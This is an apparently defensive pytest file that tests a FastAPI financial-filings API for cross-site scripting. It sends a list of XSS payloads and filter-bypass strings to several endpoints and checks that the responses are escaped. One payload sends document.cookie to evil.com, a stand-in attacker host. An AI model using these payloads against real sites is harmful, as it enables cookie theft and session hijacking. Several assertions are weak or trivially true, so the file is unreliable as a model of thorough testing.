"""
Cross-Site Scripting (XSS) Vulnerability Tests
Tests for XSS attacks in API responses and WebSocket messages
"""

import pytest
from fastapi.testclient import TestClient
import json
from typing import List

# Common XSS payloads
XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",

    # Event handler XSS
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",

    # JavaScript protocol
    "<a href='javascript:alert(\"XSS\")'>Click</a>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",

    # Encoded XSS
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",

    # DOM XSS
    "<script>document.write(document.cookie)</script>",
    "<script>window.location='http://evil.com?c='+document.cookie</script>",

    # Attribute-based XSS
    "' onmouseover='alert(\"XSS\")'",
    "\" onload=\"alert('XSS')\"",

    # Filter bypass XSS
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg><script>alert&#40;'XSS'&#41;</script>",

    # HTML5 XSS
    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<form><button formaction=javascript:alert('XSS')>",

    # CSS-based XSS
    "<style>*{background:url('javascript:alert(\"XSS\")')}</style>",
    "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
]


class TestXSSFilingsAPI:
    """Test XSS vulnerabilities in filings API"""

    @pytest.mark.asyncio
    async def test_search_filings_xss_in_company_name(self, client: TestClient):
        """Test XSS in company_name parameter"""
        for payload in XSS_PAYLOADS:
            response = client.get(
                "/api/v1/filings/search",
                params={"company_name": payload}
            )

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data)

                # Check that dangerous tags are escaped/sanitized
                assert "<script>" not in response_text.lower()
                assert "onerror=" not in response_text.lower()
                assert "javascript:" not in response_text.lower()

                # Verify HTML entities are escaped
                if "<" in payload:
                    # Should be escaped as &lt; or removed
                    assert "&lt;" in response_text or "<" not in response_text

    @pytest.mark.asyncio
    async def test_filing_analysis_xss_in_response(self, client: TestClient):
        """Test XSS in filing analysis response"""
        # Create analysis with XSS payload in accession number
        xss_accession = "<script>alert('XSS')</script>"

        response = client.post(
            f"/api/v1/filings/{xss_accession}/analyze"
        )

        if response.status_code == 200:
            data = response.json()
            response_text = json.dumps(data)

            # Verify no unescaped script tags
            assert "<script>" not in response_text
            assert "alert(" not in response_text or "alert(" in str(payload for payload in XSS_PAYLOADS)

    @pytest.mark.asyncio
    async def test_filing_text_xss_sanitization(self, client: TestClient):
        """Test XSS sanitization in filing text content"""
        response = client.get(
            "/api/v1/filings/0001234567-23-000001/text"
        )

        if response.status_code == 200:
            data = response.json()
            text_content = data.get("text", "")

            # If filing text contains HTML-like content, it should be escaped
            dangerous_patterns = [
                "<script",
                "javascript:",
                "onerror=",
                "onload=",
                "<iframe",
            ]

            for pattern in dangerous_patterns:
                if pattern in text_content.lower():
                    # Should be escaped or sanitized
                    assert "&lt;" in text_content or \
                           pattern not in text_content.replace("&lt;", "<").lower()


class TestXSSPredictionsAPI:
    """Test XSS vulnerabilities in predictions API"""

    @pytest.mark.asyncio
    async def test_prediction_request_xss(self, client: TestClient):
        """Test XSS in prediction request parameters"""
        xss_payloads = [
            {
                "accession_number": "<script>alert('XSS')</script>",
                "prediction_type": "price_movement",
                "horizon": 30
            },
            {
                "accession_number": "0001234567-23-000001",
                "prediction_type": "<img src=x onerror=alert('XSS')>",
                "horizon": 30
            },
        ]

        for payload in xss_payloads:
            response = client.post(
                "/api/v1/predictions/predict",
                json=payload
            )

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data)

                # Verify XSS payloads are sanitized
                assert "<script>" not in response_text
                assert "onerror=" not in response_text

    @pytest.mark.asyncio
    async def test_backtest_strategy_xss(self, client: TestClient):
        """Test XSS in backtest strategy parameter"""
        from datetime import date

        xss_strategy = "<svg/onload=alert('XSS')>"

        response = client.post(
            "/api/v1/predictions/backtest",
            json={
                "cik": "0001234567",
                "start_date": str(date(2023, 1, 1)),
                "end_date": str(date(2023, 12, 31)),
                "strategy": xss_strategy
            }
        )

        if response.status_code == 200:
            data = response.json()
            response_text = json.dumps(data)

            assert "<svg" not in response_text or "&lt;svg" in response_text


class TestXSSWebSocketMessages:
    """Test XSS in WebSocket messages"""

    @pytest.mark.asyncio
    async def test_websocket_broadcast_xss(self, client: TestClient):
        """Test XSS sanitization in WebSocket broadcasts"""
        # This test simulates WebSocket message broadcasting
        # In production, implement actual WebSocket testing

        # Test that filing analysis broadcasts sanitize data
        xss_accession = "<script>alert('XSS')</script>"

        response = client.post(
            f"/api/v1/filings/{xss_accession}/analyze"
        )

        # The broadcast message should sanitize the accession number
        # Verify in application logs or WebSocket monitoring


class TestHTMLSanitization:
    """Test HTML content sanitization"""

    @pytest.mark.asyncio
    async def test_content_type_headers(self, client: TestClient):
        """Test proper Content-Type headers to prevent MIME sniffing"""
        response = client.get("/api/v1/filings/search")

        # Should have proper content type
        assert response.headers.get("content-type") == "application/json"

        # Should have X-Content-Type-Options header
        assert response.headers.get("x-content-type-options") == "nosniff" or \
               "x-content-type-options" not in response.headers

    @pytest.mark.asyncio
    async def test_csp_headers(self, client: TestClient):
        """Test Content Security Policy headers"""
        response = client.get("/")

        # Check for CSP header (if implemented)
        csp_header = response.headers.get("content-security-policy")
        if csp_header:
            # Verify strict CSP
            assert "script-src 'self'" in csp_header or \
                   "script-src 'none'" in csp_header
            assert "unsafe-inline" not in csp_header or \
                   "nonce-" in csp_header

    @pytest.mark.asyncio
    async def test_xss_protection_headers(self, client: TestClient):
        """Test X-XSS-Protection headers"""
        response = client.get("/")

        # Check for X-XSS-Protection header
        xss_protection = response.headers.get("x-xss-protection")
        if xss_protection:
            assert xss_protection in ["1; mode=block", "0"]


class TestStoredXSS:
    """Test stored XSS vulnerabilities"""

    @pytest.mark.asyncio
    async def test_stored_xss_in_filing_data(self, client: TestClient):
        """Test that stored XSS payloads are sanitized on retrieval"""
        # Simulate storing filing with XSS payload
        xss_company_name = "<script>alert('Stored XSS')</script>"

        # Search for filings (which might return stored data)
        response = client.get(
            "/api/v1/filings/search",
            params={"company_name": xss_company_name}
        )

        if response.status_code == 200:
            data = response.json()
            response_text = json.dumps(data)

            # Stored XSS should be sanitized on retrieval
            assert "<script>" not in response_text

    @pytest.mark.asyncio
    async def test_stored_xss_in_predictions(self, client: TestClient):
        """Test stored XSS in prediction history"""
        xss_cik = "<img src=x onerror=alert('XSS')>"

        response = client.get(
            f"/api/v1/predictions/history/{xss_cik}"
        )

        if response.status_code == 200:
            data = response.json()
            response_text = json.dumps(data)

            assert "onerror=" not in response_text


class TestDOMXSS:
    """Test DOM-based XSS vulnerabilities"""

    @pytest.mark.asyncio
    async def test_json_response_encoding(self, client: TestClient):
        """Test that JSON responses properly encode dangerous characters"""
        dangerous_chars = ["<", ">", "&", "'", '"', "/"]

        for char in dangerous_chars:
            response = client.get(
                "/api/v1/filings/search",
                params={"company_name": f"Test{char}Company"}
            )

            if response.status_code == 200:
                # Verify proper JSON encoding
                assert response.headers.get("content-type") == "application/json"

                # Parse JSON to verify it's valid
                data = response.json()
                assert data is not None


class TestXSSFilterBypass:
    """Test XSS filter bypass attempts"""

    @pytest.mark.asyncio
    async def test_filter_bypass_techniques(self, client: TestClient):
        """Test various XSS filter bypass techniques"""
        bypass_payloads = [
            # Case variation
            "<ScRiPt>alert('XSS')</sCrIpT>",

            # Null bytes
            "<script\x00>alert('XSS')</script>",

            # Newlines
            "<script\n>alert('XSS')</script>",

            # Tab characters
            "<script\t>alert('XSS')</script>",

            # Mixed encoding
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        ]

        for payload in bypass_payloads:
            response = client.get(
                "/api/v1/filings/search",
                params={"company_name": payload}
            )

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data).lower()

                # Verify bypass attempts are blocked
                assert "alert(" not in response_text or \
                       response_text.count("alert(") == 0


@pytest.fixture
def client():
    """Create test client"""
    from src.api.main import app
    return TestClient(app)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
